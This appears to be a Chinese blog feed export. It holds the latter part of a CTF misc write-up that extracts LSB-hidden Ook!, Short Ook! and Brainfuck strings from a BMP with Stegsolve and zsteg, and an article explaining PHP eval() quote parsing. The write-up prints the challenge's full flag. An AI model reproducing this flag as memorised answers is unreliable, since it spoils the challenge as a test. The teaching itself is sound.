<h1 id="0x02-定位隐写点"><a href="#0x02-定位隐写点" class="headerlink" title="0x02 定位隐写点"></a>0x02 定位隐写点</h1><p><a href="http://www.caesum.com/handbook/stego.htm"><strong>Stegsolve</strong></a> 是专用于分析图片隐写的大杀器，用 Java 语言编写，主要功能如下所示：</p>
<ul>
<li>显示图片文件的格式信息。</li>
<li>迅速浏览每个颜色通道的位平面，以及图片的一些简单变换。</li>
<li>摘取任意颜色通道比特位的信息。</li>
<li>按特定偏移量移动解析图片。</li>
<li>剥离动图的每一帧。</li>
<li>合并两张不同的图片。</li>
</ul>
<p>当我们用 Stegsolve 加载图片 warmup.bmp 后，分别在 RGB 通道最低位的位平面上方发现了异常，由此猜测可能存在隐写。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/peak-geek-2018-misc-warmup/rgb-lsb.png" alt="rgb-lsb"></p>
<h1 id="0x03-摘取隐写信息"><a href="#0x03-摘取隐写信息" class="headerlink" title="0x03 摘取隐写信息"></a>0x03 摘取隐写信息</h1><h2 id="Stegsolve-摘取数据"><a href="#Stegsolve-摘取数据" class="headerlink" title="Stegsolve 摘取数据"></a>Stegsolve 摘取数据</h2><p>点击 Stegsolve 的 <strong>Analyse -&gt; Data Extract</strong>，在红色通道最低位上打勾，点击 <strong>Preview</strong> 后，即可在提取数据的上方发现隐写信息，最后点击 <strong>Save Bin</strong> 保存为二进制文件 red.bin。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/peak-geek-2018-misc-warmup/red-data-extract.png" alt="red-data-extract"></p>
<p>接着对绿色与蓝色通道进行相同操作，分别得到二进制文件 green.bin 和 blue.bin，用文本编辑器打开后，即可摘取数据上方的隐写信息。</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/peak-geek-2018-misc-warmup/rgb-info.png" alt="rgb-info"></p>
<p>除了使用 Stegsolve 摘取数据外，还可以尝试另一个自动化图片隐写检测工具 zsteg。</p>
<h2 id="zsteg-摘取数据"><a href="#zsteg-摘取数据" class="headerlink" title="zsteg 摘取数据"></a>zsteg 摘取数据</h2><p><a href="https://github.com/zed-0xff/zsteg"><strong>zsteg</strong></a> 是俄罗斯黑客开发的一款开源工具，专用于检测 PNG 与 BMP 格式图片中的隐写信息，用 Ruby 语言开发，主要用法如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ zsteg -h</span><br><span class="line"></span><br><span class="line">Usage: zsteg [options] filename.png [param_string]</span><br><span class="line"></span><br><span class="line">    -c, --channels X                 channels (R/G/B/A) or any combination, comma separated</span><br><span class="line">                                     valid values: r,g,b,a,rg,rgb,bgr,rgba,...</span><br><span class="line">    -l, --<span class="built_in">limit</span> N                    <span class="built_in">limit</span> bytes checked, 0 = no <span class="built_in">limit</span> (default: 256)</span><br><span class="line">    -b, --bits N                     number of bits (1..8), single value or <span class="string">&#x27;1,3,5&#x27;</span> or <span class="string">&#x27;1-8&#x27;</span></span><br><span class="line">        --lsb                        least significant BIT comes first</span><br><span class="line">        --msb                        most significant BIT comes first</span><br><span class="line">    -P, --prime                      analyze/extract only prime bytes/pixels</span><br><span class="line">    -a, --all                        try all known methods</span><br><span class="line">    -o, --order X                    pixel iteration order (default: <span class="string">&#x27;auto&#x27;</span>)</span><br><span class="line">                                     valid values: ALL,xy,yx,XY,YX,xY,Xy,bY,...</span><br><span class="line">    -E, --extract NAME               extract specified payload, NAME is like <span class="string">&#x27;1b,rgb,lsb&#x27;</span></span><br><span class="line"></span><br><span class="line">    -v, --verbose                    Run verbosely (can be used multiple <span class="built_in">times</span>)</span><br><span class="line">    -q, --quiet                      Silent any warnings (can be used multiple <span class="built_in">times</span>)</span><br><span class="line">    -C, --[no-]color                 Force (or <span class="built_in">disable</span>) color output (default: auto)</span><br><span class="line"></span><br><span class="line">PARAMS SHORTCUT</span><br><span class="line">	zsteg fname.png 2b,b,lsb,xy  ==&gt;  --bits 2 --channel b --lsb --order xy</span><br></pre></td></tr></table></figure>

<p>在 Kali Linux 中，自带 Ruby 的包管理器 RubyGems，因此直接用以下命令安装后即可使用：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gem install zsteg</span><br></pre></td></tr></table></figure>

<p>切换至图片 warmup.bmp 所在目录下，分别输入以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ zsteg warmup.bmp --bits 1 --channel r --lsb --order xy --limit 2048</span><br><span class="line">$ zsteg warmup.bmp --bits 1 --channel g --lsb --order xy --limit 2048</span><br><span class="line">$ zsteg warmup.bmp --bits 1 --channel b --lsb --order xy --limit 2048</span><br></pre></td></tr></table></figure>

<ul>
<li><code>--bits 1</code>：每次只摘取颜色通道中的第 1 个比特。</li>
<li><code>--channel r</code>：只摘取红色通道的比特位。</li>
<li><code>--lsb</code>：按最低有效位优先的顺序进行摘取。</li>
<li><code>--order xy</code>：按照从左至右、从上至下的顺序对图像素点进行摘取。</li>
<li><code>--limit 2048</code>：最多摘取输出 2048 字节。</li>
</ul>
<p>即可自动摘取出隐写在图片内的信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/peak-geek-2018-misc-warmup/rgb-zsteg.png" alt="rgb-zsteg"></p>
<p>仔细的读者还会发现，有一个懒人专属的选项 <code>--all</code>，可将所有可能的摘取方法都尝试一遍：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ zsteg warmup.bmp --all</span><br></pre></td></tr></table></figure>

<p>最终在结果中挑选出可能的隐写信息：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/peak-geek-2018-misc-warmup/rgb-zsteg-all.png" alt="rgb-zsteg-all"></p>
<h1 id="0x04-辨识特殊编码"><a href="#0x04-辨识特殊编码" class="headerlink" title="0x04 辨识特殊编码"></a>0x04 辨识特殊编码</h1><p>上述分别由 RGB 通道得到的隐写信息，属于三种特殊的编码方式，同时也是  <a href="https://www.splitbrain.org/personal">Andreas Gohr</a> 的开源项目，可在其博客上的 <a href="https://www.splitbrain.org/services/ook">Brainfuck&#x2F;Ook! Obfuscation&#x2F;Encoding</a> 在线工具中解码。</p>
<p>以上编码方式的实现，读者不必知道其原理，只需在做题过程中能辨识出来是哪种编码即可，解码的工作留给工具完成。</p>
<h2 id="Short-Ook"><a href="#Short-Ook" class="headerlink" title="Short Ook!"></a>Short Ook!</h2><p>由 red.bin 得到的隐写信息如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!...</span><br><span class="line">..... ..... !.?.. ..... !?!!. ?!!!! !!?.? !.?!! !!!.. ..... ..... .!.?.</span><br><span class="line">..... ...!? !!.?. ..... ..?.? !.?.. ..... .!.?. ..... ...!? !!.?! !!!!!</span><br><span class="line">!!?.? !.?!! !!!!! !!!!! !!!.! !!!!. ?.... ..... ....! ?!!.? !!!!! !!!!!</span><br><span class="line">!!?.? !.?!! !!!!! !!!!! !!!!! .!!!! !.!!! !!!!! !.... ..... !.!!! .....</span><br><span class="line">..!.! !!!!! !!!!! !!!!! !!!.? .</span><br></pre></td></tr></table></figure>

<p>以上编码方式称为 <strong>Short Ook!</strong> ，其包含的字符集如下所示：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
<th>ASCII 码</th>
</tr>
</thead>
<tbody><tr>
<td>!</td>
<td>叹号</td>
<td>33（\x21）</td>
</tr>
<tr>
<td>.</td>
<td>句号</td>
<td>46（\x2E）</td>
</tr>
<tr>
<td>?</td>
<td>问号</td>
<td>63（\x3F）</td>
</tr>
</tbody></table>
<p>将上述隐写信息用工具解码后得到字符串 <code>flag&#123;db640436-</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/peak-geek-2018-misc-warmup/short-ook!.png" alt="short-ook!"></p>
<h2 id="Ook"><a href="#Ook" class="headerlink" title="Ook!"></a>Ook!</h2><p>由 green.bin 得到的隐写信息如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook?</span><br><span class="line">Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br></pre></td></tr></table></figure>

<p>以上编码方式称为 <strong>Ook!</strong> ，其包含的字符集如下所示：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
<th>ASCII 码</th>
</tr>
</thead>
<tbody><tr>
<td>!</td>
<td>叹号</td>
<td>33（\x21）</td>
</tr>
<tr>
<td>.</td>
<td>句号</td>
<td>46（\x2E）</td>
</tr>
<tr>
<td>?</td>
<td>问号</td>
<td>63（\x3F）</td>
</tr>
<tr>
<td>O</td>
<td>大写字母 O</td>
<td>79（\x4F）</td>
</tr>
<tr>
<td>k</td>
<td>小写字母 k</td>
<td>107（\x6B）</td>
</tr>
<tr>
<td>o</td>
<td>小写字母 o</td>
<td>111（\x6F）</td>
</tr>
</tbody></table>
<p>将上述隐写信息用工具解码后得到字符串 <code>7839-4050-8339</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/peak-geek-2018-misc-warmup/ook!.png" alt="ook!"></p>
<h2 id="Brainfuck"><a href="#Brainfuck" class="headerlink" title="Brainfuck"></a>Brainfuck</h2><p>由 blue.bin 得到的隐写信息如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+++++ +[-&gt;+ +++++ &lt;]&gt;++ +++++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;+.-- .&lt;+++ +++[- &gt;++++</span><br><span class="line">++&lt;]&gt; +++++ +++.&lt; +++++ +[-&gt;- ----- &lt;]&gt;-- --.-- .---- -.&lt;++ +++++ [-&gt;++</span><br><span class="line">+++++ &lt;]&gt;++ +.--- .&lt;+++ +++[- &gt;---- --&lt;]&gt; ----- ----- ..--. &lt;++++ ++[-&gt;</span><br><span class="line">+++++ +&lt;]&gt;+ +++++ +++++ +.&lt;++ +++[- &gt;++++ +&lt;]&gt;+ .&lt;</span><br></pre></td></tr></table></figure>

<p>以上编码方式称为 <strong>Brainfuck</strong>，其包含的字符集如下所示：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>含义</th>
<th>ASCII 码</th>
</tr>
</thead>
<tbody><tr>
<td>+</td>
<td>加号</td>
<td>43（\x2B）</td>
</tr>
<tr>
<td>-</td>
<td>减号</td>
<td>45（\x2D）</td>
</tr>
<tr>
<td>.</td>
<td>句号</td>
<td>46（\x2E）</td>
</tr>
<tr>
<td>&lt;</td>
<td>小于号</td>
<td>60（\x3C）</td>
</tr>
<tr>
<td>&gt;</td>
<td>大于号</td>
<td>62（\x3E）</td>
</tr>
<tr>
<td>[</td>
<td>左方括号</td>
<td>91（\x5B）</td>
</tr>
<tr>
<td>]</td>
<td>右方括号</td>
<td>93（\x5D）</td>
</tr>
</tbody></table>
<p>将上述隐写信息用工具解码后得到字符串 <code>-75a972fc553c&#125;</code>：</p>
<p><img src="https://blog-1255335783.cos.ap-guangzhou.myqcloud.com/peak-geek-2018-misc-warmup/brainfuck.png" alt="brainfuck"></p>
<h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>对以上三种编码进行解码后，将得到的字符串拼接起来即得到本题的 flag：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;db640436-7839-4050-8339-75a972fc553c&#125;</span><br></pre></td></tr></table></figure>

<p>笔者借助此题，将常见的图片隐写分析方法与特殊的编码方式进行了总结，既有助于初学者学习理解，也方便自己日后查看。文中的不足或错误之后还望读者多多包涵，不吝赐教。</p>
<p>最后贴出两篇较好的 writeup 供读者学习：</p>
<blockquote>
<p><a href="https://ihomura.cn/2018/07/25/WriteUp-%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2-Misc/">WriteUp:巅峰极客 Misc</a><br><a href="http://120.79.189.7/?p=453">巅峰极客第一场CTF部分writeup</a></p>
</blockquote>
]]></content>
      <categories>
        <category>InfoSec</category>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Writeup</tag>
        <tag>Crypto</tag>
        <tag>巅峰极客</tag>
        <tag>Steganography</tag>
        <tag>Encoding</tag>
      </tags>
  </entry>
  <entry>
    <title>玩转 PHP eval() 中的单双引号</title>
    <url>/2017/11/16/play-well-single-and-double-quotes-in-eval-function-of-php/</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在一次偶然学习 PHP <strong>eval() 函数</strong>的过程中，发现<a href="http://php.net/manual/zh/function.eval.php">官方文档</a>对该函数的示例说明很有意思，刚开始有点无法理解，想通之后便记录下此次辛酸的思考历程。</p>
<span id="more"></span>

<h1 id="0x01-eval-函数"><a href="#0x01-eval-函数" class="headerlink" title="0x01 eval() 函数"></a>0x01 eval() 函数</h1><p>官方文档将 eval() 函数的解释为<strong>「把字符串参数当作 PHP 代码执行」</strong>，说明如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mixed</span> <span class="keyword">eval</span> ( <span class="keyword">string</span> <span class="variable">$code</span> )</span><br></pre></td></tr></table></figure>

<ul>
<li>参数 <code>$code</code> 是需要被执行的字符串</li>
<li>返回值类型 <code>mixed</code> 是指存在多种不同类型的返回值，默认返回 NULL；如果代码中 return 了一个值，则该值也作为函数的返回值返回；如果代码中出现解析错误，则在 PHP7 之前，返回 FALSE，在 PHP7 之后，抛出 ParseError 异常。</li>
</ul>
<p>下面说明几点注意事项：</p>
<ol>
<li>字符串中代码不要忘记语句末尾的分号；</li>
<li>return 语句会终止当前字符串的执行；</li>
<li>eval() 函数中任何的变量定义或修改，都会在函数结束后被保留；</li>
<li>若在代码执行过程中产生致命错误，则整个脚本都会终止。</li>
</ol>
<p>接下来就是有趣的例子 —— 简单的文本合并：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;cup&#x27;</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;coffee&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;This is a $string with my $name in it.&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$str = \&quot;<span class="subst">$str</span>\&quot;;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is a $string with my $name in it.</span><br><span class="line">This is a cup with my coffee in it.</span><br></pre></td></tr></table></figure>

<p>刚开始看到输出结果，百思不得其解，<code>eval(&quot;\$str = \&quot;$str\&quot;;&quot;);</code> 语句不就把字符串 <code>&quot;\$str = \&quot;$str\&quot;;&quot;</code> 当成 PHP 代码来执行吗？如果去掉 eval() 函数后直接执行 <code>$str = &quot;$str&quot;;</code> 语句，为什么输出结果就变成了 <code>This is a $string with my $name in it.</code> 呢？</p>
<h1 id="0x02-示例解析"><a href="#0x02-示例解析" class="headerlink" title="0x02 示例解析"></a>0x02 示例解析</h1><p>要理解上述现象，首先要知道以下两条规则：</p>
<h2 id="Rule-1：单引号内不解析变量，双引号内解析变量"><a href="#Rule-1：单引号内不解析变量，双引号内解析变量" class="headerlink" title="Rule 1：单引号内不解析变量，双引号内解析变量"></a><strong>Rule 1：单引号内不解析变量，双引号内解析变量</strong></h2><p>下面给出 Rule 1 的 PoC：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;Alice&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;hello $name&#x27;</span>;  <span class="comment">//单引号内变量不被解析</span></span><br><span class="line"><span class="variable">$y</span> = <span class="string">&quot;hello <span class="subst">$name</span>&quot;</span>;  <span class="comment">//双引号内变量会被解析</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;	</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>结果输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello $name</span><br><span class="line">hello Alice</span><br></pre></td></tr></table></figure>

<p>因此在 <code>eval(&quot;\$str = \&quot;$str\&quot;;&quot;);</code> 语句中，<code>\$str</code> 是为了变量不被解析成字符串，<code>\&quot;</code> 是为了转义内层的双引号，避免与外层的双引号闭合。</p>
<h2 id="Rule-2：PHP-字符串中嵌套引号的解析是由外向里的，且只解析一次"><a href="#Rule-2：PHP-字符串中嵌套引号的解析是由外向里的，且只解析一次" class="headerlink" title="Rule 2：PHP 字符串中嵌套引号的解析是由外向里的，且只解析一次"></a><strong>Rule 2：PHP 字符串中嵌套引号的解析是由外向里的，且只解析一次</strong></h2><p>换句话说，即只解析最外层的引号，下面给出 Rule 2 的 PoC：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;Alice&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;hello $name&#x27;</span>;      <span class="comment">//单引号内变量不被解析</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$x</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;       <span class="comment">//直接输出变量$x，即字符串hello $name</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$x&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;     <span class="comment">//变量$x在单引号内不被解析，故输出字符串$x</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$x</span>&quot;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;     <span class="comment">//变量$x在双引号内会被解析，故输出$x的值，即字符串hello $name</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$x</span>&#x27;&quot;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;   <span class="comment">//只有双引号起作用，变量$x会被解析，故输出字符串&#x27;hello $name&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;$x&quot;&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;   <span class="comment">//只有单引号起作用，变量$x不被解析，故输出字符串&quot;$x&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;\$x&#x27;&quot;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;  <span class="comment">//只有双引号起作用，变量$x被转义而不被解析，故输出字符串&#x27;$x&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;\$x&quot;&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;  <span class="comment">//只有单引号起作用，变量$x不被解析，故输出字符串&quot;\$x&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;\&#x27;$x\&#x27;&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>; <span class="comment">//只有外层单引号起作用，内层单引号需转义，变量$x不被解析，故输出字符串&#x27;\$x&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&quot;<span class="subst">$x</span>\&quot;&quot;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>; <span class="comment">//只有外层双引号起作用，内层双引号需转义，变量$x会被解析，故输出字符串&quot;hello $name&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$y</span> = <span class="string">&quot;hello <span class="subst">$name</span>&quot;</span>;      <span class="comment">//双引号内变量会被解析</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;       <span class="comment">//直接输出变量$y的实际值，即字符串hello Alice</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$y&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;     <span class="comment">//变量$y在单引号内不被解析，故输出字符串$y</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$y</span>&quot;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;     <span class="comment">//变量$y在双引号内会被解析，故输出$y的值，即字符串hello Alice</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;<span class="subst">$y</span>&#x27;&quot;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;   <span class="comment">//只有双引号起作用，变量$y会被解析，故输出字符串&#x27;hello Alice&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;$y&quot;&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;   <span class="comment">//只有单引号起作用，变量$y不被解析，故输出字符串&quot;$y&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#x27;\$y&#x27;&quot;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;  <span class="comment">//只有双引号起作用，变量$y被转义而不被解析，故输出字符串&#x27;$y&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&quot;\$y&quot;&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;  <span class="comment">//只有单引号起作用，变量$y不被解析，故输出字符串&quot;\$y&quot;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;\&#x27;$y\&#x27;&#x27;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>; <span class="comment">//只有外层单引号起作用，内层单引号需转义，变量$y不被解析，故输出字符串&#x27;\$y&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\&quot;<span class="subst">$y</span>\&quot;&quot;</span>, <span class="string">&#x27;&lt;br /&gt;&#x27;</span>; <span class="comment">//只有外层双引号起作用，内层双引号需转义，变量$y会被解析，故输出字符串&quot;hello Alice&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>结果输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello $name</span><br><span class="line">$x</span><br><span class="line">hello $name</span><br><span class="line">&#x27;hello $name&#x27;</span><br><span class="line">&quot;$x&quot;</span><br><span class="line">&#x27;$x&#x27;</span><br><span class="line">&quot;\$x&quot;</span><br><span class="line">&#x27;$x&#x27;</span><br><span class="line">&quot;hello $name&quot;</span><br><span class="line"></span><br><span class="line">hello Alice</span><br><span class="line">$y</span><br><span class="line">hello Alice</span><br><span class="line">&#x27;hello Alice&#x27;</span><br><span class="line">&quot;$y&quot;</span><br><span class="line">&#x27;$y&#x27;</span><br><span class="line">&quot;\$y&quot;</span><br><span class="line">&#x27;$y&#x27;</span><br><span class="line">&quot;hello Alice&quot;</span><br></pre></td></tr></table></figure>

<p>下面开始分析以下代码，为了方便理解与说明，对官网文档中示例代码的变量名稍作修改，并将 eval() 函数中的字符串语句抽离出来，单独执行：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$string</span> = <span class="string">&#x27;cup&#x27;</span>;</span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;coffee&#x27;</span>;</span><br><span class="line"><span class="variable">$origin</span> = <span class="string">&#x27;This is a $string with my $name in it.&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$origin</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result_1</span> = <span class="string">&quot;<span class="subst">$origin</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result_1</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$result_2 = \&quot;<span class="subst">$origin</span>\&quot;;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result_2</span>. <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>以上代码输出如下，也就是本人困惑的地方：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is a $string with my $name in it.</span><br><span class="line">This is a $string with my $name in it.</span><br><span class="line">This is a cup with my coffee in it.</span><br></pre></td></tr></table></figure>

<ul>
<li><code>$origin</code> 的输出没有问题，根据 Rule 1 即可理解；</li>
<li><code>$result_1</code> 的输出为什么不变呢？理解了 <code>$result_1 = &quot;$origin&quot;;</code> 就明白了。根据 Rule1，<code>$origin</code> 会被解析，得到它本身的值，即字符串 <code>&#39;This is a $string with my $name in it.&#39;</code> （注意该字符串两边的引号与 <code>$origin</code> 的相同，此处为单引号），因此 <code>$result_1</code> 的输出与 <code>$origin</code> 一样；</li>
<li><code>$result_2</code> 为什么会改变，是最难理解的。根据 Rule 2，可知 eval() 函数最外层的双引号会被解析，内层被转义的双引号原封不动，因此函数内执行的语句相当于 <code>$result_2 = &quot;This is a $string with my $name in it.&quot;</code>，注意该字符串两边已变成双引号，故$result_2&#96; 字符串中的变量会被解析。</li>
</ul>
<p>讲到这里，肯定有人疑问：不是说解析后字符串两边引号跟 <code>$origin</code> 相同吗？按理说应该是 <code>$result_2 = &quot;&#39;This is a $string with my $name in it.&#39;&quot;</code>，那么输出应该跟 Rule 2 PoC 中的 <code>echo &quot;&#39;$x&#39;&quot;</code> 一样啊！</p>
<p><strong>请注意，此处因为有个 eval() 函数，所以可以有双层解析，即第一层是解析 eval() 函数最外层的双引号，第二层是解析字符串中的双引号。</strong>类似 <code>echo &quot;&#39;$x&#39;&quot;</code> 的引号嵌套，只有单层解析，因此 <code>result_1</code> 中 <code>&#39;This is a $string with my $name in it.&#39;</code> 的单引号与 <code>$origin</code> 的相同，而 <code>result_2</code> 中 <code>&quot;This is a $string with my $name in it.&quot;</code> 的引号则由第二层的双引号赋予。</p>
<p>可能还有读者不死心，非要在赋值语句中构造双层解析，那我们就来试试看吧。在 <code>$result_1 = &quot;$origin&quot;;</code> 的基础上，再加个双引号吧，得到 <code>$result_1 = &quot;&quot;$origin&quot;&quot;;</code>，简直完美、帅气、机智…</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP Parse error:  syntax error, unexpected &#x27;$origin&#x27; (T_VARIABLE)</span><br></pre></td></tr></table></figure>

<p>咳咳，已经丧失理智到忘记相邻两个双引号会闭合吗？不行就转义吧，看我骚操作 <code>$result_1 = &quot;\&quot;$origin\&quot;&quot;;</code>，还有 <code>$result_1 = &#39;&#39;$origin&#39;&#39;;</code> 与 <code>$result_1 = &#39;\&#39;$origin\&#39;&#39;;</code>！表演结束了吗？要不送一份 Rule 2 的 PoC 给你参考参考？</p>
